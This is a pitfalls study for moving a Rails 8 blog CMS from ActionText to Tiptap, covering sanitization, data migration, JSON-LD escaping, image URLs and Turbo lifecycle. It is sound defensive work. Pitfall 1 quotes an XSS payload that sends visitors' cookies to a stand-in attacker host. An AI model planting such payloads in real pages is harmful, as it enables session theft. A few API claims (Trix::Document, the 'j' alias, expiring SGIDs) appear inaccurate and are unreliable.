# Domain Pitfalls

**Domain:** Rails 8 blog CMS — Trix-to-Tiptap migration with author profiles and SEO schema
**Researched:** 2026-05-13
**Confidence:** HIGH for Rails/ActiveStorage/Stimulus pitfalls (direct code inspection + established patterns); MEDIUM for Tailwind v4 typography details (plugin compatibility notes are training-data based, verify before Phase 3)

---

## Critical Pitfalls

These mistakes cause security vulnerabilities, data loss, or rewrites.

---

### Pitfall 1: XSS via `raw` on Tiptap HTML output

**What goes wrong:**
The PROJECT.md constraint says "raw @blog.body on show page." The current show view already does `<%= @blog.content %>` which is ActionText's sanitized output — switching to `<%= raw @blog.body %>` on an unsanitized `text` column opens a stored XSS vector. Any user who can edit blog posts (admin or future editor role) can inject `<script>` tags, `onerror` attributes, or `<iframe>` embeds that execute in visitor browsers.

**Why it happens:**
Tiptap's JavaScript editor outputs standard HTML strings. The browser DOM is the trust boundary — editors injecting `<img onerror="fetch('https://attacker.com/?c='+document.cookie)">` is a realistic attack on an admin-editable CMS. Even if only admins have access today, the attack surface matters when the team grows.

**Consequences:**
- Stored XSS accessible to every blog visitor
- Cookie theft / session hijacking of logged-in visitors
- Defacement; Google Safe Browsing flags the domain

**Prevention:**
Use `rails-html-sanitizer` (already bundled with Rails; uses Loofah/Nokogiri under the hood) to scrub body HTML before storing it. Sanitize on the model's `before_save`, not at render time. The allowlist for a blog body must be explicit:

```ruby
# app/models/blog.rb
SAFE_BODY_TAGS = %w[
  h1 h2 h3 h4 h5 h6
  p br hr
  strong em u s del ins
  ul ol li
  blockquote pre code
  a img
  table thead tbody tfoot tr th td
  figure figcaption
  div span
].freeze

SAFE_BODY_ATTRIBUTES = {
  "a"   => %w[href title target rel],
  "img" => %w[src alt title width height loading],
  "td"  => %w[colspan rowspan],
  "th"  => %w[colspan rowspan scope],
  :all  => %w[class id]
}.freeze

before_save :sanitize_body

def sanitize_body
  return if body.blank?
  scrubber = Rails::Html::SafeListSanitizer.new
  self.body = scrubber.sanitize(
    body,
    tags: SAFE_BODY_TAGS,
    attributes: SAFE_BODY_ATTRIBUTES
  )
end
```

Then in the view, use `html_safe` after the DB round-trip (the stored value is already scrubbed):

```erb
<div class="prose prose-lg max-w-none">
  <%= @blog.body.html_safe %>
</div>
```

Do NOT call `raw` — `html_safe` on a value you've already sanitized is semantically clearer and identical in result.

**Additional notes:**
- `href` on `<a>` must be checked for `javascript:` protocol — `SafeListSanitizer` strips it by default; confirm this holds if upgrading rails-html-sanitizer past 1.6.
- Tiptap image extension uploads to your own ActiveStorage endpoint, so `src` will always be a relative `/rails/active_storage/...` path — still allowlist `src` so future editors cannot inject arbitrary external image URLs that exfiltrate data via `Referer` headers.
- `rel="noopener noreferrer"` should be force-injected on all `<a target="_blank">` tags; add this as a post-sanitize Nokogiri pass or enforce it in the Tiptap link extension config.

**Warning signs:** Any template doing `<%= raw @blog.body %>` or `<%= @blog.body.html_safe %>` before a sanitize step exists in the model.

**Phase:** Phase 1 (editor + storage foundation) — sanitization must exist before the body column is writable.

---

### Pitfall 2: ActionText migration corrupting existing content or losing attachments

**What goes wrong:**
The current `action_text_rich_texts` table stores Trix HTML which contains `<action-text-attachment>` custom elements referencing ActiveStorage blobs by `sgid` (signed GlobalID). A naive migration that copies `rich_text.body.to_s` gets the raw Trix HTML string including those attachment elements — which will not render correctly in a Tiptap/prose context and will leave the attachment blobs orphaned.

The existing migration at `20251216121901` did the *reverse* move (plain text → ActionText) and called `rich_text.body.to_s` in its `down` to restore content. That pattern drops ActionText's attachment data. The new migration for Tiptap must do the opposite carefully.

**Why it happens:**
`ActionText::Content#to_s` returns rendered HTML with attachments replaced by their `<action-text-attachment>` XML elements. `.to_plain_text` strips all markup. Neither gives you "Trix HTML with inline images as `<img>` tags pointing to real URLs." You need to call `.to_rendered_html` or `.body.to_trix_html` — but `body` on an `ActionText::RichText` is a `Trix::Document` in ActionText 7+ which does not expose a clean "just img tags" HTML surface easily.

**Concrete failure modes:**
1. `rich_text.body.to_s` → stores literal `<action-text-attachment content-type="image/jpeg" sgid="...">` tags in `body` column → renders as broken markup on the public site
2. `rich_text.body.to_plain_text` → strips all formatting, images, headings
3. The SGID in the attachment element is time-limited (verifier.verify raises on expiry) → migration that tries to expand SGIDs to URLs at migration time will silently fail or produce nil image src values
4. The migration runs once; if re-run in a different environment (staging → production), blob keys differ across environments → any hardcoded blob URLs break

**Prevention:**
Do the migration in two passes:

**Pass 1 — data audit (before any schema change):**
```sql
SELECT COUNT(*) FROM action_text_rich_texts WHERE record_type = 'Blog';
SELECT COUNT(*) FROM action_text_rich_texts
  WHERE body LIKE '%action-text-attachment%';
```
This tells you how many posts have inline images that need special handling vs. posts that are pure text/formatting.

**Pass 2 — migration strategy (choose one):**

Option A (recommended for this project): Strip all `<action-text-attachment>` elements and preserve the surrounding prose HTML. Posts lose embedded images from the body, but text/headings/lists survive. Add a one-time admin notice to re-upload body images in the new Tiptap editor.

```ruby
def extract_prose_html(trix_body_string)
  doc = Nokogiri::HTML::DocumentFragment.parse(trix_body_string)
  doc.css("action-text-attachment").each(&:remove)
  doc.to_html.strip
end
```

Option B: For posts with attachments, keep ActionText body in a `body_legacy` column alongside the new `body` column, and render a fallback until manually migrated. This avoids data loss but requires temporary dual-rendering logic.

**Never do:** Copy raw `body.to_s` from ActionText directly into the new `body` column without stripping attachment elements.

**Critical migration safety rules:**
- Add the `body` column as nullable first; run data copy; add NOT NULL constraint separately after verifying all rows filled
- Wrap the data copy in a transaction
- Test the migration on a production database dump before deploying
- Keep the `action_text_rich_texts` rows intact (do not delete them) until the new body column is verified in production for 30+ days — they're your safety net

**Warning signs:** `<action-text-attachment` appearing in the new `body` column rows; posts showing raw XML on the public site; broken images on posts that previously had embedded images.

**Phase:** Phase 1 (before removing `has_rich_text :content` from the model).

---

## Critical Pitfalls (Security — XSS in JSON-LD)

### Pitfall 3: Unescaped user content injected into JSON-LD script tags

**What goes wrong:**
`application_helper.rb` already has this pattern:

```ruby
content_tag :script, schema.to_json.html_safe, type: "application/ld+json"
```

`schema.to_json` is called on a Ruby hash that includes `article.title`, `article.meta_description`, and — after this milestone — FAQ question/answer strings and author bio. If any of those fields contain `</script>` the JSON-LD block closes the script tag prematurely and allows inline JS injection.

**Prevention:**
Replace the string with a properly escaped variant. Rails' `json_escape` (alias `j`) handles this:

```ruby
content_tag :script, json_escape(schema.to_json).html_safe, type: "application/ld+json"
```

Or use `ActionView::Helpers::JavaScriptHelper#escape_javascript` on the full JSON string. The `json_escape` helper is the right tool — it replaces `</` with `<\/` and `<!--` with `<\!--` without breaking JSON parsers.

**Warning signs:** Any `content_tag :script, ....html_safe` without `json_escape` in the middle.

**Phase:** Address in Phase 1 (it's a pre-existing bug) or Phase 3 (FAQ schema addition) — but do not add new JSON-LD fields before fixing the escape.

---

## Moderate Pitfalls

---

### Pitfall 4: ActiveStorage blob URLs stored in HTML body breaking over time

**What goes wrong:**
When a user uploads an inline image via Tiptap's image extension, the upload creates an ActiveStorage blob and returns a URL. If that URL is a *signed URL* (time-limited; expires in ~5 minutes by default for private storage services) and gets stored literally in the `body` HTML, those `<img src="...">` tags will show broken images to readers after the signature expires.

**Why it happens:**
`ActiveStorage::Blob#url` in Rails 8 returns:
- For **disk service** (development/local): a signed `/rails/active_storage/blobs/redirect/...` URL — these are re-signed on each request so they do not expire in stored HTML
- For **S3 or GCS with private ACL**: a time-limited presigned URL — storing these in HTML is catastrophic
- For **S3 with public ACL** or a CDN fronting public blobs: a permanent `https://...s3.amazonaws.com/...` URL — safe to store

**Concrete failure mode:**
Tiptap image extension POSTs the file, gets back a presigned URL at e.g. `https://s3.amazonaws.com/bucket/variants/abc123?X-Amz-Expires=300&X-Amz-Signature=...`, inserts `<img src="that-url">` into editor HTML, editor submits HTML to Rails, Rails stores it — image works for 5 minutes after upload and then never again.

**Prevention — two-part fix:**

Part 1 — Image upload endpoint response: Return the blob's *permanent* identifier (key or redirect path) not a presigned URL. The Rails `ActiveStorage::DirectUploadsController` already handles the upload; the Tiptap extension's callback should call `rails_blob_path(blob, only_path: true)` and store that relative path as `src`.

Part 2 — Stored HTML sanitizer: After the body is saved, run a Nokogiri pass that rewrites any `src` values that look like presigned URLs (contain `X-Amz-Signature` or `X-Goog-Signature` query params) to blob redirect paths. This is a safety net for the upload endpoint misconfiguration.

**For this project specifically:** Check `config/storage.yml`. The project uses Kamal for deployment, so production storage is likely S3. Confirm the service configuration and blob URL type before wiring the image upload endpoint.

**Warning signs:**
- Images in blog posts broken after the first day
- `src` attributes in stored HTML containing `X-Amz-Signature` query parameters
- `src` attributes containing full S3 domain instead of `/rails/active_storage/...`

**Phase:** Phase 2 (inline image uploads) — design the upload response format correctly from the start.

---

### Pitfall 5: Tiptap + esbuild — tree-shaking kills extensions, ESM/CJS conflicts

**What goes wrong:**
The build script in `package.json` uses `--tree-shaking=true`. Tiptap packages are split into many small ESM modules (`@tiptap/core`, `@tiptap/extension-bold`, `@tiptap/extension-table`, etc.). When an extension is imported but only used as an argument to `new Editor({ extensions: [...] })`, esbuild may decide the import has no side effects and remove it — leaving the editor silently missing that capability.

Additionally, some Tiptap extension packages ship both CJS and ESM builds. The esbuild format is `--format=esm` which is correct, but if a dependency's `package.json` `exports` field is missing or malformed, esbuild may accidentally pick up the CJS build and fail with "require is not defined" at runtime in the browser.

**Specific risk in this project:**
The current build command bundles ALL entry points in `app/javascript/*.*` — the Tiptap controller will be one of them. The `--target=es2020` flag is fine for Tiptap. The `--minify` flag is aggressive and can strip code esbuild incorrectly classifies as pure.

**Prevention:**
1. Mark Tiptap extension imports with a side-effect comment if tree-shaking causes problems: `/* @__PURE__ */` is NOT what you want — instead, verify imports are consumed in the extension array.
2. Prefer importing from the top-level Tiptap packages that re-export everything (`@tiptap/starter-kit`) rather than individual extension packages where possible — fewer entry points, less tree-shaking surface.
3. Test the production build (`yarn build`) in development before shipping — do not assume `build:dev` and `build` behave identically. The minified output should be verified by checking the editor actually loads all expected extensions (toolbar buttons exist, table works, etc.).
4. For the Table extension specifically: it requires `@tiptap/extension-table`, `@tiptap/extension-table-row`, `@tiptap/extension-table-header`, `@tiptap/extension-table-cell` all imported and passed to `extensions: []`. Missing any one of these causes silent failure (table inserts but collapses to nothing).

**Warning signs:**
- Toolbar button present but clicking it does nothing
- No console errors — the extension simply was not registered
- Production site missing features that worked in development (development uses unminified build likely)

**Phase:** Phase 1 (editor foundation). Verify the build output as part of the Stimulus controller development task.

---

### Pitfall 6: Tailwind v4 — `@tailwindcss/typography` prose plugin compatibility

**What goes wrong:**
The project uses Tailwind CSS v4 (`"tailwindcss": "^4.1.14"` in package.json, `@import "tailwindcss"` CSS syntax). Tailwind v4 changed the configuration format from `tailwind.config.js` (JS object) to CSS-first configuration (`@theme` blocks in CSS). The `@tailwindcss/typography` plugin was designed for v3's plugin API.

**Current state:** The show page uses `class="prose prose-lg max-w-none"`. These classes currently work because the project is using v4 but likely has not added the typography plugin yet (the stylesheet only has `@import "tailwindcss"` and `@import "./actiontext.css"` — no plugin import). Without the typography plugin, `prose` classes are no-ops and the blog content has no typography styling.

**Confidence note:** MEDIUM — verify `@tailwindcss/typography` v4 compatibility before Phase 3. As of early 2026, the Tailwind team was shipping a v4-compatible typography plugin, but the exact import syntax changed from `plugins: [require('@tailwindcss/typography')]` in `tailwind.config.js` to `@plugin "@tailwindcss/typography"` in the CSS file. Check the current plugin version's README before implementing.

**What to do:**
```css
/* application.tailwind.css */
@import "tailwindcss";
@plugin "@tailwindcss/typography";
```

Install: `npm install @tailwindcss/typography`

**Potential class name changes:** In v4 with the typography plugin, `prose` classes remain the same name. However, if customizing prose colors/fonts via `@theme`, the v3 `tailwind.config.js` `typography` key does not apply — all prose customization moves to CSS custom properties under `@theme`.

**Warning signs:**
- `prose prose-lg` classes applied but text has no heading hierarchy styling, no blockquote styling, etc.
- Tiptap HTML with `<h2>`, `<p>`, `<blockquote>` renders as unstyled browser defaults inside the prose div

**Phase:** Phase 1 (verify prose works with Tiptap output) and Phase 3 (when WYSIWYG heading preview is required in the editor itself).

---

### Pitfall 7: FAQ JSON storage — serialization gotchas and form param handling

**What goes wrong:**
The plan is to store FAQ Q&A pairs in a `faq_schema` text column serialized as JSON. The following specific failures occur in practice:

**Failure A — Double serialization:**
If the model uses `serialize :faq_schema, JSON` (old ActiveRecord style) AND the form submits a JSON string (not a nested params hash), Rails will double-serialize: the string gets JSON-encoded again, resulting in `"\"[{\\\"question\\\"...}]\""` stored in the column instead of `[{"question":...}]`.

**Failure B — nil vs empty array:**
On a new blog post, `faq_schema` is NULL in the database. `JSON.parse(nil)` raises `TypeError`. Any helper or schema renderer that calls `JSON.parse(@blog.faq_schema)` without a nil guard will raise a 500 on every new blog show page.

**Failure C — Form params with dynamic Q&A rows (Stimulus-driven):**
A dynamic "add row" Stimulus controller that appends `<input name="blog[faq_schema][][question]">` fields works in Rails strong params if permitted as `faq_schema: [:question, :answer]`. But if the Stimulus controller instead serializes the array to a JSON string and puts it in a hidden field `<input name="blog[faq_schema]" value='[{"question":...}]'>`, strong params receives it as a plain string, not a nested hash — requiring explicit `JSON.parse` in the controller before assignment.

**Prevention:**
Use a Rails attribute with custom casting (preferred over `serialize`):

```ruby
# app/models/blog.rb
attribute :faq_schema, :string
before_save :normalize_faq_schema

def faq_items
  return [] if faq_schema.blank?
  parsed = JSON.parse(faq_schema)
  parsed.is_a?(Array) ? parsed : []
rescue JSON::ParserError
  []
end

def normalize_faq_schema
  # Accept array from nested params or string from JSON hidden field
  if faq_schema.is_a?(Array)
    self.faq_schema = faq_schema.to_json
  elsif faq_schema.is_a?(String)
    JSON.parse(faq_schema) # validate parseable, raise early
    # keep as-is
  end
rescue JSON::ParserError
  self.faq_schema = "[]"
end
```

In the controller, permit the hidden JSON field as a plain string: `permit(:faq_schema)`.

Always call `blog.faq_items` (the safe accessor) in templates and schema helpers, never `JSON.parse(@blog.faq_schema)` directly.

**Warning signs:**
- `JSON::ParserError` in production logs on blog show
- FAQ array stored as `"\"[{...}]\""` (double-encoded string)
- FAQPage JSON-LD emitting empty `mainEntity` array when FAQ is present

**Phase:** Phase 3 (FAQ schema builder) — design the storage accessor before the form is built.

---

### Pitfall 8: Author FK nullable — nil author_id breaking show page and schema

**What goes wrong:**
All existing blog posts have no `author_id` — the column does not exist yet. After adding `author_id` as a nullable FK, three places silently fail or raise:

1. **Show page author card partial**: `@blog.author` (the current string field) and `@blog.author_profile` (the new association) are different things. Code that does `@blog.author_profile.avatar` raises `NoMethodError` when `author_id` is nil. Code that does `<%= @blog.author_profile.name %>` blows up on every pre-migration post.

2. **Person schema in JSON-LD**: `render_article_schema` currently hardcodes `"author": { "@type": "Organization", "name": "Revnous" }`. If the helper is updated to emit a Person type when `blog.author_profile` exists, it must guard `blog.author_profile&.name` etc. A nil `name` field in schema.org Person produces invalid JSON-LD that Google's rich results test will flag.

3. **seo_description fallback**: `Blog#seo_description` calls `strip_tags(content)` on the ActionText content object. After migration to `body`, this needs to call `strip_tags(body)` — missing the update causes NoMethodError if `content` is gone.

**Prevention:**

Migration: add `author_id` as nullable with no default. Do NOT add `NOT NULL` constraint yet. The constraint can be added in a future migration once all posts have been assigned or left intentionally authorless.

```ruby
add_reference :blogs, :author, foreign_key: { to_table: :users }, null: true
```

Model association with nil guard:
```ruby
belongs_to :author, class_name: "User", optional: true
```

Show page pattern:
```erb
<% if @blog.author.present? %>
  <%= render "blogs/author_card", author: @blog.author %>
<% end %>
```

Schema helper nil guard:
```ruby
author_schema = if article.author.present?
  {
    "@type": "Person",
    "name": [article.author.first_name, article.author.last_name].join(" ").strip.presence || "Unknown",
    "url": article.author.linkedin_url.presence
  }.compact
else
  { "@type": "Organization", "name": "Revnous" }
end
```

**Warning signs:**
- `NoMethodError: undefined method 'avatar' for nil` in production blog show
- `author_id` present but author user deleted — ensure `dependent: :nullify` or a DB-level `ON DELETE SET NULL` on the FK

**Phase:** Phase 2 (author profiles) — the association + optional: true + nil guards must be done in the same PR as the migration.

---

### Pitfall 9: Stimulus + Tiptap lifecycle — editor not mounting on Turbo cache restore

**What goes wrong:**
Turbo Drive caches pages using the DOM snapshot taken just before navigation. When a user navigates to the admin blog edit page, fills in the Tiptap editor, navigates away (e.g. to the blogs list), then hits the browser Back button, Turbo restores the cached DOM snapshot. That snapshot contains the Tiptap `<div contenteditable="true">` DOM with whatever content was in the editor — but the Stimulus controller's `connect()` lifecycle has NOT re-fired. The Tiptap `Editor` instance is gone (garbage collected or was attached to the previous Stimulus controller instance). The contenteditable div appears to show content, but submitting the form sends the hidden `<input name="blog[body]">` which still has the *last-saved* value, not the current editor content.

Additionally, Tiptap creates its own DOM structure inside the target element. When Turbo restores the snapshot, it may restore the Tiptap-created DOM rather than the original `<div data-controller="tiptap">` — causing a second `connect()` call to try mounting Tiptap inside an already-Tiptap-structured element, producing doubled toolbar buttons or corrupt editor state.

**Prevention — three-layer defense:**

Layer 1 — Disable Turbo caching on the admin blog form pages:
```erb
<head>
  <meta name="turbo-cache-control" content="no-cache">
</head>
```
Or per-page in the layout via `content_for`. This is the simplest and most reliable fix. Admin edit forms rarely benefit from Back-button cache restoration.

Layer 2 — Handle `turbo:before-cache` in the Stimulus controller:
```javascript
connect() {
  this.editor = new Editor({ ... })
  document.addEventListener("turbo:before-cache", this.teardown)
}

disconnect() {
  this.teardown()
  document.removeEventListener("turbo:before-cache", this.teardown)
}

teardown = () => {
  if (this.editor) {
    this.editor.destroy()
    this.editor = null
  }
}
```

Layer 3 — Keep a hidden input in sync with editor content on every `update` event so the form always has the latest content:
```javascript
this.editor = new Editor({
  onUpdate: ({ editor }) => {
    this.hiddenInputTarget.value = editor.getHTML()
  }
})
```

**Warning signs:**
- Form submit after Back navigation saves empty or stale body
- Tiptap toolbar appears doubled on the edit page
- `this.editor is null` errors in console on Back navigation

**Phase:** Phase 1 (Stimulus controller foundation) — the teardown + hidden input sync must be part of the initial controller implementation, not a later fix.

---

## Minor Pitfalls

---

### Pitfall 10: `Blog#seo_description` references `content` after column removal

**What goes wrong:**
`Blog#seo_description` currently does `strip_tags(content)` where `content` is the ActionText association. After the migration removes `has_rich_text :content` and the `action_text_rich_texts` row, calling `content` on a Blog instance will either return nil (if the association is removed) or raise `NoMethodError` (if `has_rich_text` is removed from the model before the method is updated).

**Prevention:** Update `seo_description` in the same commit that removes `has_rich_text :content`:

```ruby
def seo_description
  meta_description.presence || ActionController::Base.helpers.strip_tags(body).truncate(160)
end
```

**Warning signs:** `undefined method 'content' for #<Blog>` in application logs after the migration.

**Phase:** Phase 1 — same PR as the migration.

---

### Pitfall 11: `Blog` model `validates :content, presence: true` breaks after migration

**What goes wrong:**
The model currently has `validates :title, :content, presence: true`. After removing `has_rich_text :content`, validating `content` validates a non-existent attribute — Rails will either silently ignore it (if the attribute is fully gone) or raise errors on save because `content` is always blank. Either way the intent is wrong.

**Prevention:** Replace with `validates :title, :body, presence: true` in the same PR as the migration.

**Phase:** Phase 1 — same PR as the migration.

---

### Pitfall 12: esbuild entry point glob picking up the Tiptap controller twice

**What goes wrong:**
The build script is `esbuild app/javascript/*.* --bundle ...`. This bundles everything at the top level of `app/javascript/`. When a new `tiptap_controller.js` is added at `app/javascript/controllers/tiptap_controller.js`, it is NOT directly bundled as an entry point (correct — it's imported via `controllers/index.js`). But if someone places a test file or utility at `app/javascript/tiptap_utils.js`, it becomes a separate bundle entry point, potentially duplicating the Tiptap code in two bundle outputs and inflating download size.

**Prevention:** Keep the controllers directory as the only location for Tiptap-related JavaScript. Do not place utility modules directly in `app/javascript/` root — use `app/javascript/lib/` or similar and import them from a controller, not as top-level entry points.

**Phase:** Phase 1 — establish file organization in the first Tiptap PR.

---

### Pitfall 13: OG image override stored as URL vs. ActiveStorage attachment

**What goes wrong:**
The project plan says "OG image override (separate from cover photo)." Two implementation paths exist and they have different gotchas:

- **As a URL string column**: Simple, but whoever enters the URL must use an absolute URL. Relative paths break OG meta tags. No CDN rewriting. Stale if the domain changes.
- **As a separate `has_one_attached` attachment**: Correct approach, but the `cover_photo_url` helper already has a complex blob-URL-generation pattern to avoid signed URLs. A second attachment needs the same treatment.

**Prevention:** Use `has_one_attached :og_image` and reuse the `cover_photo_url` pattern from the existing model. In the `page_og_image` assignment in `BlogsController#show`, prefer `url_for(@blog.og_image)` over `rails_blob_path` to get a CDN-friendly absolute URL.

**Phase:** Phase 3 (SEO fields).

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|----------------|------------|
| Phase 1: body column migration | ActionText attachment elements left in HTML | Nokogiri strip pass before copying; keep ActionText rows for 30 days |
| Phase 1: Tiptap Stimulus controller | Turbo cache restore zombie editor | `turbo:before-cache` teardown + hidden input sync from day one |
| Phase 1: `raw @blog.body` | Stored XSS | Sanitize on `before_save` with SafeListSanitizer allowlist; use `.html_safe` not `raw` |
| Phase 1: validation update | `validates :content` on removed attribute | Update to `:body` in same PR |
| Phase 1: seo_description | References removed `content` attribute | Update to use `body` in same PR |
| Phase 2: inline image uploads | Presigned URL stored in HTML body | Return blob redirect path from upload endpoint, not presigned S3 URL |
| Phase 2: author_id FK | nil author blowing up show page | `optional: true`, nil guards everywhere, `ON DELETE SET NULL` on FK |
| Phase 3: FAQ JSON | Double serialization / nil parse | Use `faq_items` accessor, guard nil, store as normalized JSON string |
| Phase 3: JSON-LD injection | `</script>` in author bio or FAQ answer | `json_escape` wrapper on all JSON-LD `content_tag :script` calls |
| Phase 3: OG image | Signed blob URL in meta tag | Use `url_for` with host; verify URL is absolute before rendering meta |
| All phases: Tailwind v4 prose | Typography plugin not loaded | Verify `@plugin "@tailwindcss/typography"` syntax; test prose classes after every build |

---

## Sources

- Direct inspection of codebase: `app/models/blog.rb`, `app/controllers/admin/blogs_controller.rb`, `app/views/blogs/show.html.erb`, `app/views/admin/blogs/_form.html.erb`, `app/helpers/application_helper.rb`, `db/schema.rb`, `db/migrate/20251216121901_migrate_blog_content_to_rich_text.rb`, `app/javascript/application.js`, `package.json`
- Rails HTML Sanitizer gem (rails-html-sanitizer, ships with Rails, wraps Loofah/Nokogiri) — SafeListSanitizer API: HIGH confidence, stable API
- ActionText SGID/attachment model — HIGH confidence, documented Rails behavior
- ActiveStorage URL signing behavior (disk vs S3 service) — HIGH confidence, documented Rails behavior
- Tiptap extension architecture and table multi-package requirement — HIGH confidence
- Stimulus `connect`/`disconnect` lifecycle with Turbo cache — HIGH confidence, documented Turbo/Stimulus interaction
- Tailwind v4 `@plugin` syntax — MEDIUM confidence (verify against current `@tailwindcss/typography` README before Phase 3)
- `json_escape` for JSON-LD XSS prevention — HIGH confidence, documented Rails helper
